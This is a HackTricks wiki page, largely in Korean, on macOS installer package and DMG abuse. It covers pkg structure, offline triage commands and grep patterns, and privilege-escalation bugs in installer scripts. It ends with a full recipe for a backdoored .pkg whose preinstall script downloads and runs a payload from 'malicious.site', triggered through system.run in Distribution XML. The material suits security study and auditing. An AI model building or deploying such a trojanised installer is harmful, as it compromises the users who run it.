# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

macOS **installer package**(또는 `.pkg` 파일)는 macOS가 **소프트웨어를 배포**하는 데 사용하는 파일 형식입니다. 이 파일들은 올바르게 설치되고 실행되는 데 필요한 **모든 것을 담고 있는 상자**와 같습니다.

패키지 파일 자체는 대상 컴퓨터에 **설치될 파일과 디렉터리의 계층 구조**를 담고 있는 아카이브입니다. 또한 설치 전후에 작업을 수행하기 위한 **스크립트**를 포함할 수 있으며, 예를 들면 구성 파일을 설정하거나 오래된 소프트웨어 버전을 정리하는 작업이 있습니다.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: 사용자 지정(title, welcome text…) 및 script/installation checks
- **PackageInfo (xml)**: 정보, 설치 요구사항, 설치 위치, 실행할 scripts 경로
- **Bill of materials (bom)**: file permissions와 함께 설치, 업데이트 또는 제거할 파일 목록
- **Payload (CPIO archive gzip compressed)**: PackageInfo의 `install-location`에 설치할 파일들
- **Scripts (CPIO archive gzip compressed)**: 실행을 위해 temp directory로 추출되는 pre 및 post install scripts와 추가 리소스들.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
압축을 수동으로 풀지 않고도 installer의 내용을 시각화하려면 무료 도구 [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/)를 사용할 수도 있습니다.

### Static triage shortcuts

목표가 분석이라면, 먼저 **`Installer.app`로 package를 여는 것을 피하세요**. 일부 package는 Installer가 여는 즉시 code를 실행할 수 있습니다(예: `system.run()` 또는 installer plug-ins를 통해). 따라서 offline extraction이 보통 더 안전한 시작점입니다.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Basic Information

DMG 파일, 또는 Apple Disk Images는 Apple의 macOS에서 disk images에 사용되는 파일 형식입니다. DMG 파일은 본질적으로 **mountable disk image**(자체 filesystem을 포함함)이며, 일반적으로 압축되고 때로는 암호화된 raw block data를 포함합니다. DMG 파일을 열면 macOS는 이를 **실제 물리적 disk인 것처럼 mount**하여 내용에 접근할 수 있게 합니다.

> [!CAUTION]
> **`.dmg`** installers는 **너무 많은 format**을 지원하므로, 과거에는 취약점을 포함한 일부가 악용되어 **kernel code execution**을 얻는 데 사용되었습니다.

### Hierarchy

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG 파일의 hierarchy는 content에 따라 다를 수 있습니다. 그러나 application DMG의 경우 보통 다음 structure를 따릅니다:

- Top Level: disk image의 root입니다. 보통 application과, 경우에 따라 Applications folder로의 link를 포함합니다.
- Application (.app): 실제 application입니다. macOS에서 application은 일반적으로 application을 구성하는 많은 개별 file과 folder를 포함하는 package입니다.
- Applications Link: macOS의 Applications folder로 가는 shortcut입니다. 이것의 목적은 application 설치를 쉽게 만드는 것입니다. .app file을 이 shortcut으로 drag하면 app이 설치됩니다.

## Privesc via pkg abuse

### Execution from public directories

만약 pre 또는 post installation script가 예를 들어 **`/var/tmp/Installerutil`**에서 실행되고 있고, attacker가 그 script를 control할 수 있다면, 실행될 때마다 privileges를 escalate할 수 있습니다. 또는 비슷한 다른 예시는 다음과 같습니다:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

이것은 여러 installer와 updater가 **root로 어떤 것을 실행**하기 위해 호출하는 [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)입니다. 이 function은 **execute할 file의 path**를 parameter로 받지만, attacker가 이 file을 **modify**할 수 있다면 root 권한으로의 실행을 **abuse**하여 privileges를 **escalate**할 수 있습니다.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
더 많은 정보는 이 talk를 확인하세요: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Environment and shebang abuse

Modern PackageKit bugs showed that installer scripts are often executed as **trusted root code** while still keeping attacker-controlled context nearby. When auditing vendor packages, pay special attention to:

- `#!/bin/zsh` / `#!/bin/bash` 같은 Shell interpreters
- `sudo -u $USER`, `launchctl asuser` 같은 호출이나 `$USER`, `$HOME`, `PATH`, `TMPDIR`, 또는 relative paths를 신뢰하는 로직
- user-controlled init files 또는 libraries를 로드할 수 있는 Non-shell interpreters
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024 PackageKit root-environment 버그(`~/.zshenv` / `~/.bash*` inheritance during user-initiated installs)에 대해서는 [generic macOS privesc page](../macos-privilege-escalation.md)를 확인하세요. 패키지가 **Apple-signed**인 경우, 같은 script bug는 `system_installd`가 `com.apple.rootless.install.heritable`을 가질 수 있으므로 **SIP/TCC-relevant**가 될 수 있습니다. 자세한 내용은 [the SIP page](../macos-security-protections/macos-sip.md)를 보세요.

### Execution by mounting

installer가 `/tmp/fixedname/bla/bla`에 쓰는 경우, `noowners`로 `/tmp/fixedname` 위에 **mount를 생성**할 수 있어서 설치 중에 **아무 파일이나 수정**하여 installation process를 악용할 수 있습니다.

이것의 예가 **CVE-2021-26089**인데, 이는 root로 execution을 얻기 위해 **periodic script를 overwrite**하는 데 성공했습니다. 더 자세한 내용은 talk를 보세요: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

실제 payload 없이, script 안의 malware 외에는 아무것도 없는 **pre and post-install scripts**를 가진 **`.pkg`** 파일을 생성하는 것이 가능합니다.

### JS in Distribution xml

package의 **distribution xml** 파일에 **`<script>`** 태그를 추가할 수 있으며, 그 코드는 실행되고 **`system.run`**을 사용해 commands를 **execute**할 수 있습니다:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

distribution packages에서는 보통 최상위 `Distribution` 파일이 `allow-external-scripts="true"` 같은 방식으로 external scripts를 허용하는지에 따라 달라집니다. 따라서 `preinstall` / `postinstall`만 검토하는 것으로는 충분하지 않습니다: **Distribution XML 자체**에 `installation-check` / `volume-check` hooks와 직접적인 `system.run()` / `system.runOnce()` execution path가 포함될 수 있습니다.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### 백도어된 설치 프로그램

dist.xml 내부의 script와 JS code를 사용하는 악성 installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
